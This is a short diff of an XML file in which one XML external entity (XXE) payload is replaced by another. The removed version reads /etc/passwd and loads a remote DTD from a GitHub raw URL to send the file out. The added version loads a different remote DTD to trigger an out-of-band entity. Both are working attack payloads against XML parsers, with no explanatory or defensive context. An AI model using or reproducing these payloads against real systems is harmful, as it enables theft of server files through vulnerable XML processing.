@@ -1,8 +1,3 @@
-<?xml version="1.0"?>
-<!DOCTYPE ANY[
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/MMSNN121/notes/MMSNN121-patch-1/info2.xml">
-%remote;
-%all;
-]>
-<root>&send;</root>
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/MMSNN121/notes/MMSNN121-patch-1/info.dtd">%remote;%int;]>
+<a>&trick;</a>
